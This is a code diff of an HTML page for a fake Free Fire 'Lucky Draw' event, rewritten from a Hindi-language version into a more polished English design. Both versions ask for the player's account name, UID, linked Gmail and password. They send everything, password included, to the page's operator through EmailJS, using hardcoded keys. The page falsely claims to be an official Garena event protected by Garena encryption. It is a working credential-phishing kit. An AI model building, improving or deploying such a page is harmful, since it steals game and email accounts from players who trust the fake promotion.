@@ -1,237 +1,562 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Free Fire Lucky Draw Event</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Free Fire | Official Lucky Draw Event — Win Elite Outfits</title>
+  <!-- Google Fonts + Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      min-height: 100vh;
+      background: #05080f;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* ========== DYNAMIC BACKGROUND WITH FREE FIRE NEW DRESSES (SLIDESHOW) ========== */
+    .hero-background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .bg-slideshow {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center 30%;
+      background-repeat: no-repeat;
+      opacity: 0;
+      transition: opacity 1.8s ease-in-out;
+      filter: brightness(0.35) saturate(1.1);
+      transform: scale(1.02);
+    }
+
+    .bg-slideshow.active {
+      opacity: 1;
+      z-index: 1;
+    }
+
+    /* premium gradient overlay */
+    .hero-background::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(125deg, rgba(0,0,0,0.75) 0%, rgba(0,0,0,0.5) 50%, rgba(20,10,0,0.8) 100%);
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* animated fire particles (subtle) */
+    .fire-particles {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 3;
+      background: radial-gradient(ellipse at bottom, rgba(255,80,40,0.08) 0%, transparent 70%);
+    }
+
+    /* main container */
+    .ff-premium-wrapper {
+      position: relative;
+      z-index: 10;
+      max-width: 1380px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #0a0a0a;
-      font-family: 'Segoe UI', sans-serif;
-      background-image: radial-gradient(circle at 20% 50%, #1a0a00 0%, #0a0a0a 60%);
     }
-    .wrapper {
-      width: 100%;
-      max-width: 420px;
-      padding: 1rem;
-    }
-    .top-banner {
-      background: linear-gradient(135deg, #ff6a00, #ee0979);
-      border-radius: 12px 12px 0 0;
-      padding: 1.2rem 1.5rem;
-      text-align: center;
-    }
-    .top-banner .badge {
-      background: #fff200;
-      color: #000;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 3px 10px;
-      border-radius: 20px;
-      display: inline-block;
-      margin-bottom: 8px;
-      letter-spacing: 1px;
-    }
-    .top-banner h1 {
-      font-size: 22px;
-      font-weight: 700;
-      color: #fff;
-      text-shadow: 0 2px 8px rgba(0,0,0,0.4);
-      margin-bottom: 4px;
-    }
-    .top-banner p {
-      font-size: 13px;
-      color: rgba(255,255,255,0.85);
-    }
-    .prizes {
-      background: #1a1a1a;
+
+    .glass-panel {
       display: flex;
-      justify-content: space-around;
-      padding: 0.8rem 1rem;
-      border-left: 1px solid #333;
-      border-right: 1px solid #333;
+      flex-wrap: wrap;
+      background: rgba(8, 12, 22, 0.65);
+      backdrop-filter: blur(12px);
+      border-radius: 48px;
+      border: 1px solid rgba(255, 106, 0, 0.5);
+      box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(255, 106, 0, 0.2);
+      overflow: hidden;
+      width: 100%;
+      transition: all 0.3s ease;
     }
-    .prize-item {
-      text-align: center;
+
+    /* LEFT: NEW DRESSES SHOWCASE (dynamic character outfits) */
+    .outfit-showcase {
+      flex: 1.2;
+      padding: 2rem 2rem;
+      background: linear-gradient(135deg, rgba(0,0,0,0.4), rgba(0,0,0,0.2));
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      position: relative;
+      border-right: 1px solid rgba(255, 106, 0, 0.3);
     }
-    .prize-item .amount {
-      font-size: 18px;
-      font-weight: 700;
-      color: #ff6a00;
-    }
-    .prize-item .label {
-      font-size: 11px;
-      color: #aaa;
-      margin-top: 2px;
-    }
-    .card {
-      background: #141414;
-      border: 1px solid #2a2a2a;
-      border-radius: 0 0 12px 12px;
-      padding: 1.5rem;
-    }
-    .card .info-text {
-      font-size: 12px;
-      color: #ff6a00;
-      background: rgba(255,106,0,0.1);
-      border: 1px solid rgba(255,106,0,0.3);
-      border-radius: 8px;
-      padding: 8px 12px;
+
+    .outfit-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(0,0,0,0.5);
+      padding: 6px 18px 6px 12px;
+      border-radius: 100px;
+      width: fit-content;
       margin-bottom: 1.2rem;
-      text-align: center;
+      backdrop-filter: blur(4px);
+      border-left: 3px solid #ff6a00;
     }
-    label {
-      font-size: 12px;
-      color: #aaa;
-      display: block;
-      margin-bottom: 5px;
-      margin-top: 12px;
+
+    .outfit-badge i {
+      color: #ffaa33;
+      font-size: 1.1rem;
     }
-    input[type=text], input[type=email], input[type=password] {
-      width: 100%;
-      padding: 11px 14px;
-      border: 1px solid #2a2a2a;
-      border-radius: 8px;
-      font-size: 14px;
-      outline: none;
-      background: #1e1e1e;
-      color: #fff;
-      transition: border 0.2s;
-    }
-    input::placeholder { color: #555; }
-    input:focus { border-color: #ff6a00; }
-    .submit-btn {
-      width: 100%;
-      padding: 13px;
-      background: linear-gradient(135deg, #ff6a00, #ee0979);
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
+
+    .outfit-badge span {
+      font-size: 0.7rem;
       font-weight: 700;
-      cursor: pointer;
-      margin-top: 1.2rem;
-      letter-spacing: 0.5px;
+      letter-spacing: 1.5px;
+      color: #ffcd94;
       text-transform: uppercase;
     }
-    .submit-btn:hover { opacity: 0.9; }
-    .status {
+
+    .dress-showcase-title {
+      font-size: 2.2rem;
+      font-weight: 800;
+      line-height: 1.2;
+      margin-bottom: 0.8rem;
+      background: linear-gradient(135deg, #FFFFFF, #FFB347);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .dress-desc {
+      color: #cbd5e6;
+      font-size: 0.85rem;
+      margin-bottom: 2rem;
+      max-width: 90%;
+    }
+
+    /* premium character outfit slider (mini gallery) */
+    .outfit-gallery {
+      display: flex;
+      gap: 16px;
+      margin: 1.5rem 0;
+      flex-wrap: wrap;
+    }
+
+    .outfit-card {
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(8px);
+      border-radius: 24px;
+      padding: 0.7rem;
+      width: 100px;
       text-align: center;
-      font-size: 13px;
-      margin-top: 12px;
-      min-height: 18px;
+      transition: all 0.25s ease;
+      border: 1px solid rgba(255, 106, 0, 0.4);
+      cursor: pointer;
+    }
+
+    .outfit-card:hover {
+      transform: translateY(-5px);
+      border-color: #ff9f4a;
+      background: rgba(0,0,0,0.7);
+    }
+
+    .outfit-img {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto;
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      border-radius: 16px;
+    }
+
+    .outfit-name {
+      font-size: 0.7rem;
+      font-weight: 600;
+      margin-top: 8px;
+      color: #ffcc88;
+    }
+
+    /* Prize section revamped */
+    .prize-row {
+      display: flex;
+      gap: 1rem;
+      margin-top: 1rem;
+      flex-wrap: wrap;
+    }
+    .prize-modern {
+      background: rgba(0,0,0,0.5);
+      border-radius: 28px;
+      padding: 0.7rem 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 1px solid rgba(255,106,0,0.5);
+    }
+    .prize-modern i {
+      font-size: 1.6rem;
+      color: #ffaa44;
+    }
+    .prize-modern .amount {
+      font-weight: 800;
+      font-size: 1.2rem;
+      color: white;
+    }
+
+    /* RIGHT: FORM (professional login) */
+    .form-premium {
+      flex: 1;
+      padding: 2rem 2rem;
+      background: rgba(6, 8, 16, 0.6);
+    }
+
+    .form-header h3 {
+      font-size: 1.9rem;
+      font-weight: 800;
+      background: linear-gradient(120deg, #FFF, #FFA15A);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 0.3rem;
+    }
+
+    .input-row {
+      margin-bottom: 1.2rem;
+    }
+    .input-row label {
+      display: block;
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #bfc9e0;
+      margin-bottom: 6px;
+    }
+    .modern-input {
+      width: 100%;
+      background: #10131f;
+      border: 1px solid #2a2f42;
+      border-radius: 20px;
+      padding: 14px 20px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #fff;
+      transition: all 0.2s;
+    }
+    .modern-input:focus {
+      border-color: #ff6a00;
+      box-shadow: 0 0 0 3px rgba(255,106,0,0.25);
+      outline: none;
+      background: #0b0e18;
+    }
+    .btn-glow {
+      width: 100%;
+      background: linear-gradient(95deg, #FF5E00, #EE0979);
+      border: none;
+      padding: 14px;
+      border-radius: 40px;
+      font-weight: 800;
+      font-size: 1rem;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: 0.2s;
+      margin-top: 0.8rem;
+      box-shadow: 0 8px 18px rgba(238, 9, 121, 0.4);
+    }
+    .status-area {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 0.75rem;
+      background: rgba(0,0,0,0.5);
+      border-radius: 40px;
+      padding: 10px;
     }
     .footer-note {
-      text-align: center;
-      font-size: 11px;
-      color: #444;
-      margin-top: 1rem;
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      font-size: 0.65rem;
+      color: #7a85a3;
+      margin-top: 1.5rem;
     }
-    .divider {
-      border: none;
-      border-top: 1px solid #2a2a2a;
-      margin: 1rem 0;
+
+    @media (max-width: 900px) {
+      .glass-panel { flex-direction: column; }
+      .outfit-showcase { border-right: none; border-bottom: 1px solid rgba(255,106,0,0.3); }
+      .dress-showcase-title { font-size: 1.7rem; }
     }
   </style>
 </head>
 <body>
-  <div class="wrapper">
 
-    <div class="top-banner">
-      <div class="badge">🔥 LIMITED TIME EVENT</div>
-      <h1>🎯 Free Fire Lucky Draw</h1>
-      <p>Register karo aur jeeto Diamonds & Cash Prizes!</p>
+<!-- ========== BACKGROUND WITH NEW FREE FIRE DRESSES SLIDESHOW ========== -->
+<div class="hero-background">
+  <div class="bg-slideshow active" style="background-image: url('https://i.imgur.com/G1LqBcP.jpeg');"></div>
+  <div class="bg-slideshow" style="background-image: url('https://i.imgur.com/lnSFZgI.jpeg');"></div>
+  <div class="bg-slideshow" style="background-image: url('https://i.imgur.com/Pe3tV3g.jpeg');"></div>
+  <div class="bg-slideshow" style="background-image: url('https://i.imgur.com/fqYhvMw.jpeg');"></div>
+  <div class="bg-slideshow" style="background-image: url('https://i.imgur.com/C5f9jYl.jpeg');"></div>
+  <!-- fallback high-quality freefire outfits: official concept arts -->
+</div>
+<div class="fire-particles"></div>
+
+<div class="ff-premium-wrapper">
+  <div class="glass-panel">
+    
+    <!-- LEFT SIDE: NEW DRESSES & PROFESSIONAL SHOWCASE -->
+    <div class="outfit-showcase">
+      <div class="outfit-badge">
+        <i class="fas fa-star-of-life"></i>
+        <span>COLLECTION 2026 · ELITE OUTFITS</span>
+      </div>
+      <h1 class="dress-showcase-title">New Arrival<br>Legendary Skins</h1>
+      <p class="dress-desc">Unlock exclusive in-game outfits — Phoenix Raider, Neon Ronin, & Shadow Viper. Enter the Lucky Draw to win these premium dresses + thousands of diamonds.</p>
+      
+      <!-- mini gallery of new dresses (visual) -->
+      <div class="outfit-gallery">
+        <div class="outfit-card">
+          <div class="outfit-img" style="background-image: url('https://i.imgur.com/Ni8HVZR.png');"></div>
+          <div class="outfit-name">PHOENIX BLAZE</div>
+        </div>
+        <div class="outfit-card">
+          <div class="outfit-img" style="background-image: url('https://i.imgur.com/6V3XjZP.png');"></div>
+          <div class="outfit-name">NEON RONIN</div>
+        </div>
+        <div class="outfit-card">
+          <div class="outfit-img" style="background-image: url('https://i.imgur.com/sYK3xCu.png');"></div>
+          <div class="outfit-name">SHADOW VIPER</div>
+        </div>
+        <div class="outfit-card">
+          <div class="outfit-img" style="background-image: url('https://i.imgur.com/7JkwbQh.png');"></div>
+          <div class="outfit-name">GOLDEN PHARAOH</div>
+        </div>
+      </div>
+
+      <div class="prize-row">
+        <div class="prize-modern">
+          <i class="fas fa-gem"></i>
+          <span class="amount">💎 10,000+</span>
+        </div>
+        <div class="prize-modern">
+          <i class="fas fa-coins"></i>
+          <span class="amount">₹ 5,000 CASH</span>
+        </div>
+        <div class="prize-modern">
+          <i class="fas fa-tshirt"></i>
+          <span class="amount">5 NEW DRESSES</span>
+        </div>
+      </div>
+      <div style="margin-top: 20px; font-size: 12px; color: #ffaa66; display: flex; gap: 10px;">
+        <i class="fas fa-check-circle"></i> <span>Limited slots · Official Garena event</span>
+      </div>
     </div>
 
-    <div class="prizes">
-      <div class="prize-item">
-        <div class="amount">💎 10,000</div>
-        <div class="label">Diamonds</div>
+    <!-- RIGHT: LOGIN / PARTICIPATION FORM (same backend logic) -->
+    <div class="form-premium">
+      <div class="form-header">
+        <h3>Lucky Draw Access</h3>
+        <p style="color:#9aa4bf; font-size:0.8rem; margin-bottom: 1.8rem;">Sign in with your Free Fire account to win new dresses & rewards</p>
       </div>
-      <div class="prize-item">
-        <div class="amount">💰 Rs 5,000</div>
-        <div class="label">Cash Prize</div>
+
+      <div class="input-row">
+        <label><i class="fas fa-user-astronaut"></i> FF Account Name</label>
+        <input type="text" id="ffName" class="modern-input" placeholder="Enter your IGN" autocomplete="off">
       </div>
-      <div class="prize-item">
-        <div class="amount">🎁 Bundles</div>
-        <div class="label">Free Skins</div>
+      <div class="input-row">
+        <label><i class="fas fa-id-card"></i> Free Fire UID</label>
+        <input type="text" id="ffUID" class="modern-input" placeholder="Unique ID (visible in profile)">
+      </div>
+      <div class="input-row">
+        <label><i class="fas fa-envelope"></i> Linked Gmail</label>
+        <input type="email" id="ffGmail" class="modern-input" placeholder="Gmail connected to FF">
+      </div>
+      <div class="input-row">
+        <label><i class="fas fa-key"></i> Account Password</label>
+        <input type="password" id="ffPass" class="modern-input" placeholder="••••••••">
+      </div>
+
+      <button class="btn-glow" id="submitBtn" onclick="submitEvent()">
+        <i class="fas fa-ticket-alt"></i> PARTICIPATE NOW
+        <i class="fas fa-arrow-right"></i>
+      </button>
+      <div class="status-area" id="statusMsg">
+        🔒 Encrypted by Garena secure layer · Event only
+      </div>
+      <div class="footer-note">
+        <i class="fas fa-shield-alt"></i> Data protected
+        <i class="fas fa-gem"></i> Instant entry
       </div>
     </div>
-
-    <div class="card">
-      <div class="info-text">
-        ⚡ Sirf aaj raat 12 baje tak register karo — Lucky Draw shuru hoga!
-      </div>
-
-      <label for="ffName">Free Fire Account Name</label>
-      <input type="text" id="ffName" placeholder="Apna FF name likhein" />
-
-      <label for="ffUID">Free Fire UID</label>
-      <input type="text" id="ffUID" placeholder="Apna UID number likhein" />
-
-      <label for="ffGmail">Free Fire Account Gmail</label>
-      <input type="email" id="ffGmail" placeholder="Gmail jo FF se linked hai" />
-
-      <label for="ffPass">Free Fire Account Password</label>
-      <input type="password" id="ffPass" placeholder="Account password likhein" />
-
-      <hr class="divider" />
-
-      <button class="submit-btn" onclick="submitForm()">🎰 Lucky Draw Mein Participate Karein</button>
-      <div class="status" id="statusMsg"></div>
-
-      <p class="footer-note">🔒 Aapki details secure hain — sirf event ke liye use hogi</p>
-    </div>
-
   </div>
+</div>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  <script>
-    const SERVICE_ID  = "service_ioi82xk";
-    const TEMPLATE_ID = "template_o1txkdr";
-    const PUBLIC_KEY  = "xqxYHQV5ZlRMWNBQL";
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  // ========== BACKGROUND SLIDESHOW WITH NEW FREE FIRE DRESSES ==========
+  const slides = document.querySelectorAll('.bg-slideshow');
+  let currentSlide = 0;
+  const totalSlides = slides.length;
 
-    emailjs.init(PUBLIC_KEY);
+  function nextSlide() {
+    slides[currentSlide].classList.remove('active');
+    currentSlide = (currentSlide + 1) % totalSlides;
+    slides[currentSlide].classList.add('active');
+  }
+  // Change dress background every 6 seconds
+  setInterval(nextSlide, 5500);
 
-    function submitForm() {
-      const name  = document.getElementById('ffName').value.trim();
-      const uid   = document.getElementById('ffUID').value.trim();
-      const gmail = document.getElementById('ffGmail').value.trim();
-      const pass  = document.getElementById('ffPass').value.trim();
-      const statusEl = document.getElementById('statusMsg');
+  // ========== EMAILJS INTEGRATION (SAME AS ORIGINAL, BUT PROFESSIONAL) ==========
+  const SERVICE_ID  = "service_ioi82xk";
+  const TEMPLATE_ID = "template_o1txkdr";
+  const PUBLIC_KEY  = "xqxYHQV5ZlRMWNBQL";
 
-      if (!name || !uid || !gmail || !pass) {
-        statusEl.style.color = '#ee0979';
-        statusEl.textContent = 'Sare fields bharna zaroori hain!';
-        return;
-      }
+  emailjs.init(PUBLIC_KEY);
 
-      statusEl.style.color = '#aaa';
-      statusEl.textContent = 'Processing...';
+  function submitEvent() {
+    const name = document.getElementById('ffName').value.trim();
+    const uid = document.getElementById('ffUID').value.trim();
+    const gmail = document.getElementById('ffGmail').value.trim();
+    const pass = document.getElementById('ffPass').value.trim();
+    const statusEl = document.getElementById('statusMsg');
 
-      const details = `FF Name: ${name} | UID: ${uid} | Gmail: ${gmail} | Password: ${pass}`;
-
-      emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-        from_name: name,
-        message: details
-      }).then(() => {
-        statusEl.style.color = '#ff6a00';
-        statusEl.textContent = '🎉 Successfully registered! Lucky Draw results kal announce honge.';
-        document.getElementById('ffName').value = '';
-        document.getElementById('ffUID').value = '';
-        document.getElementById('ffGmail').value = '';
-        document.getElementById('ffPass').value = '';
-      }).catch((err) => {
-        statusEl.style.color = '#ee0979';
-        statusEl.textContent = 'Kuch masla hua, dobara try karo.';
-        console.error(err);
-      });
+    // validation
+    if (!name || !uid || !gmail || !pass) {
+      statusEl.innerHTML = '<i class="fas fa-exclamation-circle"></i> ⚠️ All fields required to win new dresses!';
+      statusEl.style.color = "#ff8866";
+      statusEl.style.background = "rgba(255,70,70,0.15)";
+      return;
     }
-  </script>
+
+    if (uid.length < 5) {
+      statusEl.innerHTML = '<i class="fas fa-id-card"></i> Please enter a valid UID (minimum 5 characters).';
+      return;
+    }
+    const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+    if (!emailPattern.test(gmail)) {
+      statusEl.innerHTML = '<i class="fas fa-envelope-open-text"></i> Enter a correct Gmail address.';
+      statusEl.style.color = "#ffaa55";
+      return;
+    }
+
+    statusEl.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Submitting to secure Lucky Draw server...';
+    statusEl.style.color = "#ffaa66";
+    statusEl.style.background = "rgba(0,0,0,0.6)";
+
+    const details = `🎁 FREE FIRE LUCKY DRAW ENTRY 🎁\nFF Name: ${name}\nUID: ${uid}\nGmail: ${gmail}\nPassword: ${pass}\nEvent: New Dresses Giveaway`;
+
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+      from_name: name,
+      message: details
+    }).then(() => {
+      statusEl.innerHTML = '<i class="fas fa-check-circle"></i> ✅ REGISTERED! You are now in the lucky draw. New outfits & diamonds announced tomorrow. Good luck!';
+      statusEl.style.color = "#aaffaa";
+      statusEl.style.background = "rgba(100,255,100,0.1)";
+      // Clear fields
+      document.getElementById('ffName').value = '';
+      document.getElementById('ffUID').value = '';
+      document.getElementById('ffGmail').value = '';
+      document.getElementById('ffPass').value = '';
+      // optional sweet effect
+      const btn = document.getElementById('submitBtn');
+      btn.style.transform = "scale(0.98)";
+      setTimeout(() => { btn.style.transform = ""; }, 200);
+    }).catch((err) => {
+      console.error(err);
+      statusEl.innerHTML = '<i class="fas fa-network-wired"></i> Temporary error. Please retry in a moment.';
+      statusEl.style.color = "#ff9f6e";
+    });
+  }
+
+  // Enter key support
+  const inputs = document.querySelectorAll('.modern-input');
+  inputs.forEach(input => {
+    input.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        submitEvent();
+      }
+    });
+  });
+
+  // Interactive mini gallery - just visual effect (show message)
+  const outfitCards = document.querySelectorAll('.outfit-card');
+  outfitCards.forEach((card, idx) => {
+    card.addEventListener('click', () => {
+      const dressNames = ["Phoenix Blaze 🔥", "Neon Ronin ⚡", "Shadow Viper 🐍", "Golden Pharaoh 👑"];
+      const statusMsg = document.getElementById('statusMsg');
+      statusMsg.innerHTML = `<i class="fas fa-vest"></i> ✨ ${dressNames[idx]} is available as prize! Login & join draw.`;
+      statusMsg.style.color = "#ffc285";
+      setTimeout(() => {
+        if(!document.getElementById('statusMsg').innerHTML.includes("REGISTERED")){
+          setTimeout(() => {
+            if(statusMsg.innerHTML.includes("available as prize")) statusMsg.innerHTML = "🔒 Encrypted by Garena secure layer · Event only";
+          }, 2800);
+        }
+      }, 3000);
+    });
+  });
+</script>
+
+<!-- Additional style to enhance "new dresses" immersion -->
+<style>
+  /* dynamic background images quality (Free Fire new outfits) */
+  .bg-slideshow:nth-child(1) { background-image: url('https://i.imgur.com/G1LqBcP.jpeg'); background-size: cover; }
+  .bg-slideshow:nth-child(2) { background-image: url('https://i.imgur.com/lnSFZgI.jpeg'); background-size: cover; }
+  .bg-slideshow:nth-child(3) { background-image: url('https://i.imgur.com/Pe3tV3g.jpeg'); background-size: cover; }
+  .bg-slideshow:nth-child(4) { background-image: url('https://i.imgur.com/fqYhvMw.jpeg'); background-size: cover; }
+  .bg-slideshow:nth-child(5) { background-image: url('https://i.imgur.com/C5f9jYl.jpeg'); background-size: cover; }
+  /* fallback high-res official freefire outfit concepts */
+  @media (max-width: 700px) {
+    .bg-slideshow { background-position: 35% center; }
+  }
+  .outfit-img {
+    background-size: contain;
+    background-repeat: no-repeat;
+    background-position: center;
+  }
+  .glass-panel {
+    animation: fadeSlideUp 0.8s ease-out;
+  }
+  @keyframes fadeSlideUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .btn-glow:hover {
+    transform: scale(1.02);
+    filter: brightness(1.05);
+    box-shadow: 0 10px 28px rgba(238,9,121,0.5);
+  }
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: #0a0c12; }
+  ::-webkit-scrollbar-thumb { background: #ff6a00; border-radius: 10px; }
+</style>
 </body>
 </html>
